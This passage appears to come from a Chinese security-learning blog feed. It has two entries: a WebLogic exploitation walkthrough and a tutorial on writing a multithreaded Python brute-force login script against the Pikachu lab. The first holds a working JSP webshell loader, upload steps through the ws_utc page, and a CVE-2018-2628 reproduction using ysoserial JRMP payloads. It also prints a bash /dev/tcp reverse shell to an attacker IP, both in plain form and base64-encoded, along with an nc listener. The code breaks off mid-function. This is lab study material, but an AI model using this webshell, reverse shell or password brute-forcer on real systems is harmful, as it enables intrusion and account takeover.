base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.getParameter(&quot;fafa&quot;);    if (cls != null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;</code></pre><p><img src="/../image/image-20240718123559300.png" alt="image-20240718123559300"></p><p>文件上传的路径为<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAbp%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%EF%BC%8C">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，</a></p><p><img src="/../image/image-20240718124112290.png" alt="image-20240718124112290"></p><p>其二利用浏览器自带的检查获取，如下所示：</p><p><img src="/../image/image-20240718123631916.png" alt="image-20240718123631916"></p><pre><code>http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp</code></pre><p>这里的环境有点问题，待测，重新用docker起了环境，重复上述步骤</p><p><img src="/../image/image-20240719104623897.png" alt="image-20240719104623897"></p><p>这里先去靶场看看后台账户密码，默认管理员用户是weblogic，此处密码为h3L0YiTp</p><p><img src="/../image/image-20240719104726677.png" alt="image-20240719104726677"></p><p>输入账户密码，登录后台</p><p><img src="/../image/image-20240719104859192.png" alt="image-20240719104859192"></p><p>成功登录进去，点击base_domain可看到设置页面，然后点击高级，勾选启用Web服务测试页；</p><p><img src="/../image/image-20240719105013862.png" alt="image-20240719105013862"></p><p>点击保存</p><p><img src="/../image/image-20240719105135228.png" alt="image-20240719105135228"></p><p>访问漏洞页面<a href="http://192.168.174.137:7001/ws_utc/config.do%EF%BC%88%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AEWork">http://192.168.174.137:7001/ws_utc/config.do（需要手动设置一下环境设置Work</a> Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css）</p><p><img src="/../image/image-20240719105223765.png" alt="image-20240719105223765"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为rebeyond）；</p><p><img src="/../image/image-20240719105321462.png" alt="image-20240719105321462"></p><p><img src="/../image/image-20240719105401564.png" alt="image-20240719105401564"></p><p>文件上传的路径为<a href="http://192.168.174.137:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://192.168.174.137:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p><p><img src="/../image/image-20240719105432337.png" alt="image-20240719105432337"></p><p>尝试访问文件地址，发现文件存在且可以正常访问</p><p><img src="/../image/image-20240719105519747.png" alt="image-20240719105519747"></p><p>冰蝎连接</p><p><img src="/../image/image-20240719105611812.png" alt="image-20240719105611812"></p><p><img src="/../image/image-20240719105644878.png" alt="image-20240719105644878"></p><p>成功获得shell</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p><p>同为WebLogic T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>docker-compose起环境，访问</p><p><img src="/../image/image-20240718210439993.png" alt="image-20240718210439993"></p><p>这里先使用nmap扫描一下是否开启了WebLogic T3服务</p><pre><code>nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</code></pre><p><img src="/../image/image-20240718211002989.png" alt="image-20240718211002989"></p><p>漏洞检测脚本，好多扫不出来，试试以前的旧版本</p><p><img src="/../image/image-20240718231224408.png" alt="image-20240718231224408"></p><p><img src="/../image/image-20240718212511966.png" alt="image-20240718212511966"></p><p>要专门这个探测工具才行。。但教程很多都是用旧版的ysoserial-0.1-cve-2018-2628-all，我试试新版的工具怎么用</p><p><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a></p><p>启动JRMP Server（下面这个是练习）：</p><pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami</code></pre><p>反弹shell命令：</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1</code></pre><p>base64编码<a href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p><pre><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p>开启JMRP Server服务：</p><pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></pre><p>本地监听9999端口：</p><pre><code>nc -lvvp 9999</code></pre><p>这个payload还有点难生成xxd装不上记得更新下源</p><pre><code>sudo apt-get update</code></pre><pre><code>java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#39;\n&#39; &amp;&amp; echo #JRMP监听的端口</code></pre><p>和之前的比，payload没有2了是JRMPClient</p><p><img src="/../image/image-20240718234851924.png" alt="image-20240718234851924"></p><p>替换payload</p><p><img src="/../image/image-20240718234930633.png" alt="image-20240718234930633"></p><p><img src="/../image/image-20240718234944773.png" alt="image-20240718234944773"></p><p>半天没弹回来，保留一下，用别的方法测测</p><p>在攻击机设置好JRM服务,这里执行touch命令时，注意路径</p><pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;</code></pre><p><img src="/../image/image-20240719000106128.png" alt="image-20240719000106128"></p><p>打开weblogictool，如图设置好参数</p><p><img src="/../image/image-20240719000143387.png" alt="image-20240719000143387"></p><p>执行后，在docker容器里查看,yml文件在哪就在哪执行</p><pre><code>docker-compose exec weblogic /bin/bash</code></pre><p><img src="/../image/image-20240719000226949.png" alt="image-20240719000226949"></p><p>成功执行，那回到第一种方法，利用payload，重新走一遍</p><p>开启JMRP Server服务：</p><pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><img src="/../image/image-20240719090315802.png" alt="image-20240719090315802"></p><p>更新payload,windows下没有环境，在linux中执行,前面好像执行错了，这里客户端的ip是靶机的ip</p><pre><code>sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#39;\n&#39; &amp;&amp; echo</code></pre><p><img src="/../image/image-20240719091031289.png" alt="image-20240719091031289"></p><p>更换payload</p><p><img src="/../image/image-20240719090714180.png" alt="image-20240719090714180"></p><p><img src="/../image/image-20240719091109057.png" alt="image-20240719091109057"></p><p>使用 nc 进行监听本地的9999端口</p><pre><code>nc -lvvp 9999</code></pre><p><img src="/../image/image-20240719091155144.png" alt="image-20240719091155144"></p><p>执行poc还是不行，但后面在在kali测试好像就行了，python脚本执行完要过一会才有反弹回来。。</p><p><img src="/../image/image-20240719101534297.png" alt="image-20240719101534297"></p><p><img src="/../image/image-20240719101931805.png" alt="image-20240719101931805"></p><p>前面也弹回来了，是我没注意。。。</p><p><img src="/../image/image-20240719102247152.png" alt="image-20240719102247152"></p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简易爆破poc</title>
      <link href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/"/>
      <url>/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/</url>
      
        <content type="html"><![CDATA[<h1 id="POC学习"><a href="#POC学习" class="headerlink" title="POC学习"></a>POC学习</h1><p>​POC测试，即Proof of Concept，是业界流行的针对客户具体应用的验证性测试，根据用户对采用系统提出的性能要求和扩展需求的指标，在选用服务器上进行真实数据的运行，对承载用户数据量和运行时间进行实际测算，并根据用户未来业务扩展的需求加大数据量以验证系统和平台的承载能力和性能变化。<br>​今天，王哥演示了一下一个爆破脚本编写，也就是写了个poc来验证是复测弱口令漏洞</p><p>​这里对上课学的东西做一下复盘，写一个结合自己理解的POC，可以参考很多例子，但还是写一个自己思路的把</p><p><a href="https://cloud.tencent.com/developer/article/1759225">https://cloud.tencent.com/developer/article/1759225</a></p><h2 id="基于pikachu弱口令爆破的脚本"><a href="#基于pikachu弱口令爆破的脚本" class="headerlink" title="基于pikachu弱口令爆破的脚本"></a>基于pikachu弱口令爆破的脚本</h2><p>​在用xray扫pikachu靶场时，我们会遇到暴力破解的漏洞，这时候我们可以写一个简单的爆破脚本来测试，虽然burp很好用，但写一个poc练习一下也挺好的，写一下需求思维导图，流程图</p><p>​爆破，顾名思义，简单粗暴，对账号，密码用字典一个一个匹配测试，思路比较简单，但实际情况很复杂，有验证码，流量限制等。我们需要考虑这些问题。下面给出一个需求的思维导图。</p><p><img src="/../image/image-20240719211510589.png" alt="image-20240719211510589"></p><p>需求要点多，一步一步来吧，像上课一样，先获取页面，传参，交互，慢慢添加功能，再画一个功能的流程图</p><p>![一个爆破账号密码的python工具流程图 (1)](C:\Users\yxz\Downloads\一个爆破账号密码的python工具流程图 (1).png)</p><p>上面是ai生成的，好细致，还学了两个点，输出日志和结果，这是我没考虑到的。下面先针对pikachu的爆破页面进行编写</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>操作系统：windows10</p><p>运行环境：python 3.9.12，pycharm</p><p>主要依赖：在requirement.txt里</p><h2 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h2><p>先具体看下页面内容，爬虫后续再实现</p><p><img src="/../image/image-20240720095556210.png" alt="image-20240720095556210"></p><p>查看源码</p><p><img src="/../image/image-20240720095708441.png" alt="image-20240720095708441"></p><p>post方法，这样子参数不好确定，抓包看看</p><p><img src="/../image/image-20240720095839240.png" alt="image-20240720095839240"></p><p>可以，确定参数</p><pre><code>username=admin&amp;password=admin&amp;submit=Login</code></pre><h2 id="获取页面"><a href="#获取页面" class="headerlink" title="获取页面"></a>获取页面</h2><p>这个可以用requests模块，不会用就搜怎么用</p><p><a href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p><pre><code class="python">import requestsurl = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;r = requests.post(url)print(r.text)</code></pre><p><img src="/../image/image-20240720103304336.png" alt="image-20240720103304336"></p><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><pre><code>username=admin&amp;password=admin&amp;submit=Login</code></pre><p>传递参数，requests要求参数要写成key-value的格式，也可以是json的格式，这里我们用字典的形式传参，这里先写个正确的密码，看返回内容会不会改变</p><p>传回来的内容，有点难看，看下给它保存成html文件试试</p><pre><code class="python">with open ( r&#39;HTML.html&#39;, &#39;w+&#39;) as f:    f.write(r.text)</code></pre><p><img src="/../image/image-20240720104937870.png" alt="image-20240720104937870"></p><p>返回成功的标志是success</p><h2 id="判断是否成功"><a href="#判断是否成功" class="headerlink" title="判断是否成功"></a>判断是否成功</h2><p>可以先用简单if in来试试，简单修改下代码</p><pre><code class="python">#!/usr/bin/ python3# _*_ coding:utf-8 _*_import requestsusername=&quot;admin&quot;password=&quot;123456&quot;data = &#123;    &quot;username&quot;:username,    &quot;password&quot;:password,    &quot;submit&quot;:&quot;Login&quot;&#125;url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;r = requests.post(url,data=data)#print(type(r))# with open ( r&#39;HTML.html&#39;, &#39;w+&#39;) as f:#     f.write(r.text)#print(r.text)if &quot;success&quot; in r.text:    print(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)</code></pre><p><img src="/../image/image-20240720105304209.png" alt="image-20240720105304209"></p><h2 id="结合字典"><a href="#结合字典" class="headerlink" title="结合字典"></a>结合字典</h2><p><img src="/../image/image-20240720105405572.png" alt="image-20240720105405572"></p><p>username.txt（pikachu打错了）</p><p><img src="/../image/image-20240720105444526.png" alt="image-20240720105444526"></p><p>password.txt</p><p><img src="/../image/image-20240720160206509.png" alt="image-20240720160206509"></p><p>读取字典，存为列表</p><pre><code class="python">with open(&quot;username.txt&quot;,&quot;r&quot;) as f1:    username = f1.read().split(&quot;\n&quot;)with open(&quot;password.txt&quot;,&quot;r&quot;) as f2:    password = f2.read().split(&quot;\n&quot;)print(username)# print(password[1])print(password)</code></pre><p><img src="/../image/image-20240720163133423.png" alt="image-20240720163133423"></p><h2 id="执行爆破run"><a href="#执行爆破run" class="headerlink" title="执行爆破run"></a>执行爆破run</h2><p>我们可以把爆破过程封装成一个函数</p><pre><code class="python">def run(username,pssword,url):    for i in username:        for j in password:            data = &#123;                &quot;username&quot;: i,                &quot;password&quot;: j,                &quot;submit&quot;: &quot;Login&quot;            &#125;            r = requests.post(url, data=data)            if &quot;success&quot; in r.text:                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)            else:                print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</code></pre><p>然后执行run函数</p><p><img src="/../image/image-20240720163820838.png" alt="image-20240720163820838"></p><p>如果我们只想看成功例子，可以把else注释了</p><p><img src="/../image/image-20240720164108876.png" alt="image-20240720164108876"></p><p>到这里就基本实现了一个爆破的poc了，下面我们可以继续扩展</p><p>高级：<a href="https://www.cnblogs.com/JIAcheerful/p/18226320">https://www.cnblogs.com/JIAcheerful/p/18226320</a></p><h2 id="扩展一：用参数指定两个字典"><a href="#扩展一：用参数指定两个字典" class="headerlink" title="扩展一：用参数指定两个字典"></a>扩展一：用参数指定两个字典</h2><p><a href="https://blog.csdn.net/MengYa_Dream/article/details/124451852">https://blog.csdn.net/MengYa_Dream/article/details/124451852</a></p><p>这里就要用到我们的parser库了，在学习过程 中，发现argparser更好用,下面这个是官中文档，有例子，容易理解</p><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html">https://docs.python.org/zh-cn/3/library/argparse.html</a></p><p>使用 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#module-argparse"><code>argparse</code></a> 的第一步是创建一个 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象：</p><pre><code class="python">import argparser #导入argparser模块parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)</code></pre><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象包含将命令行解析成 Python 数据类型所需的全部信息。</p><h3 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h3><p><a href="https://blog.csdn.net/MilkLeong/article/details/115639740">https://blog.csdn.net/MilkLeong/article/details/115639740</a></p><p>给一个 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 添加程序参数信息是通过调用 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument"><code>add_argument()</code></a> 方法完成的。通常，这些调用指定 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 如何获取命令行字符串并将其转换为对象。这些信息在 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args"><code>parse_args()</code></a> 调用时被存储和使用。例如：</p><pre><code class="python">parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)</code></pre><p>完成代码</p><pre><code class="python">import argparse #导入模块#获取字典数据存为列表def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return dataparser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)print(username)print(password)</code></pre><p>如果是pycharm可以在Terminal里测试</p><p><img src="/../image/image-20240720171822365.png" alt="image-20240720171822365"></p><p>这里为了方便演示，我就在外面的cmd里演示了</p><p><img src="/../image/image-20240720185111324.png" alt="image-20240720185111324"></p><p><img src="/../image/image-20240720185127470.png" alt="image-20240720185127470"></p><p>可以，这时候我们就可以去改我们的poc了</p><pre><code class="python">#!/usr/bin/ python3# _*_ coding:utf-8 _*_import requestsimport argparse#文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return dataparser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)#print(username)#print(password)url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;def run(username,pssword,url):    for i in username:        for j in password:            data = &#123;                &quot;username&quot;: i,                &quot;password&quot;: j,                &quot;submit&quot;: &quot;Login&quot;            &#125;            r = requests.post(url, data=data)            if &quot;success&quot; in r.text:                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)            # else:            #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)run(username,password,url)</code></pre><p><img src="/../image/image-20240720193949945.png" alt="image-20240720193949945"></p><p>成功执行，然后在写这个功能的时候遇到个问题，就是虚拟机挂起了，服务没了，这时候未响应，也没有输出，我们可以做个探活，然后可以看下这篇文章，后续有用</p><p><a href="https://blog.csdn.net/heqiang525/article/details/89879056">https://blog.csdn.net/heqiang525/article/details/89879056</a></p><h2 id="扩展二：探测服务存活"><a href="#扩展二：探测服务存活" class="headerlink" title="扩展二：探测服务存活"></a>扩展二：探测服务存活</h2><p><a href="https://blog.csdn.net/CNXBDSa/article/details/120055796">https://blog.csdn.net/CNXBDSa/article/details/120055796</a></p><pre><code class="python">import requestsurl = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;try:    respone = requests.get(url, timeout=5)    print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)except requests.exceptions.RequestException as e:    print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;e&#125;&quot;)</code></pre><p>原理就是根据响应码来判断，我们先看看服务存活的结果</p><p><img src="/../image/image-20240720200228410.png" alt="image-20240720200228410"></p><p>可以看到是存活的，下面我们把服务关闭试试</p><p><img src="/../image/image-20240720200308097.png" alt="image-20240720200308097"></p><p><img src="/../image/image-20240720200400844.png" alt="image-20240720200400844"></p><p>可以看到返回失败的信息了，当然如果网络状态不好的状况下，我们可以适当提高timeout的时间，我们可以把timeout作为可控参数传递，然后设置好默认的值为5</p><pre><code class="python">parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)</code></pre><p>然后报错信息有时候太多影响体验可以看下这篇</p><p><a href="https://geek-docs.com/python/python-ask-answer/620_python_getting_exception_details_in_python.html#:~:text=%E5%BD%93Python%E8%A7%A3%E9%87%8A%E5%99%A8%E9%81%87%E5%88%B0%E9%94%99%E8%AF%AF%E6%97%B6%EF%BC%8C%E4%BC%9A%E5%BC%95%E5%8F%91%E4%B8%80%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E3%80%82,%E8%BF%99%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E5%8C%85%E5%90%AB%E4%BA%86%E5%87%BA%E9%94%99%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%92%8C%E4%BD%8D%E7%BD%AE%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E3%80%82%20%E9%80%9A%E8%BF%87%E6%8D%95%E8%8E%B7%E5%92%8C%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%E6%97%B6%E4%B8%8D%E4%B8%AD%E6%96%AD%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%80%8C%E6%98%AF%E6%8F%90%E4%BE%9B%E4%B8%80%E4%BA%9B%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E6%88%96%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E3%80%82">Python 获取Python中的异常详细信息</a></p><pre><code class="python">def check(url, timeout):    try:        respone = requests.get(url, timeout=timeout)        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return respone.status_code    except requests.exceptions.RequestException as e:        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return</code></pre><p>这样子报错信息会少很多</p><p><img src="/../image/image-20240720201506459.png" alt="image-20240720201506459"></p><p>也可以测试timeout参数有没有生效，不懂有没有上限，我们设置个10s，在10s内我们把服务重新启动起来看看，我这样子设计不合理，连接是一次请求，一次返回。如果没有明确返回，才会探测，如果直接拒绝连接，导致失败，它都不会等，所以这个实验不靠谱，要限制流量测试才合理，但这个有点难度。。。暂时不测了，先放那。</p><h2 id="扩展三：提升速度"><a href="#扩展三：提升速度" class="headerlink" title="扩展三：提升速度"></a>扩展三：提升速度</h2><p><a href="https://www.bilibili.com/video/BV1bK411A7tV/?spm_id_from=333.337.search-card.all.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">Python 并发编程实战，用多线程、多进程、多协程加速程序运行</a></p><p><a href="https://blog.csdn.net/weixin_52906070/article/details/132317118">python并发编程这一篇就够了</a></p><p>多线程:threading，利用CPU和IO可以同时执行的原理，让CPU不会干巴巴等待IO完成</p><p>多进程:multiprocessing，利用多核CPU的能力，真正的并行执行任务</p><p>asyncio,异步IO:在单线程利用CPU和IO同时执行的原理，实现函数异步执行</p><p>使用Lock对资源加锁，防止冲突访问</p><p>使用Queue实现不同线程&#x2F;进程之间的数据通信，实现生产者-消费者模式</p><p>操作系统的超级难点。。。。</p><p>使用线程池Pool&#x2F;进程池Po0l，简化线程&#x2F;进程的任务提交、等待结束、获取结果</p><p>使用subprocess启动外部程序的进程，并进行输入输出交互</p><p><img src="/../image/image-20240720203118431.png" alt="image-20240720203118431"></p><p>怎么感觉爆破，两个都沾点，但应该是IO密集型，网络开销比较大</p><p><img src="/../image/image-20240720203257214.png" alt="image-20240720203257214"></p><p><img src="/../image/image-20240720203336198.png" alt="image-20240720203336198"></p><p>选择多线程</p><p><img src="/../image/image-20240720203524130.png" alt="image-20240720203524130"></p><p>后面的生产者消费者就不看了，太难了，下面是两种代码</p><p>原版</p><pre><code class="python">#!/usr/bin/ python3# _*_ coding:utf-8 _*_import requestsimport argparseimport time# 文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return dataparser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)timeout = args.timeout# print(username)# print(password)url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;# 探活def check(url, timeout):    try:        respone = requests.get(url, timeout=timeout)        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return respone.status_code    except requests.exceptions.RequestException as e:        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return# 主函数def run(username, password, url, timeout):    if check(url, timeout) != 200:        return    for i in username:        for j in password:            data = &#123;                &quot;username&quot;: i,                &quot;password&quot;: j,                &quot;submit&quot;: &quot;Login&quot;            &#125;            r = requests.post(url, data=data)            if &quot;success&quot; in r.text:                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)            # else:            #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)    returnif __name__ == &quot;__main__&quot;:    start = time.time()    run(username, password, url, timeout)    end = time.time()    print(&quot;time&quot;+str(end - start)+&quot;seconds&quot;)</code></pre><p>多线程</p><pre><code class="python">#!/usr/bin/ python3# _*_ coding:utf-8 _*_import requestsimport argparseimport threadingimport time# 文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return dataparser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)timeout = args.timeout# print(username)# print(password)url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;# 探活def check(url, timeout):    try:        respone = requests.get(url, timeout=timeout)        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return respone.status_code    except requests.exceptions.RequestException as e:        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return# 主函数def run(username, password, url):    data = &#123;        &quot;username&quot;: username,        &quot;password&quot;: password,        &quot;submit&quot;: &quot;Login&quot;    &#125;    r = requests.post(url, data=data)    if &quot;success&quot; in r.text:        print(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)    # else:    #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)    return# 多线程def multi_thread(username, password,url,timeout):    if check(url, timeout) != 200:        return    threads = []    for i in username:        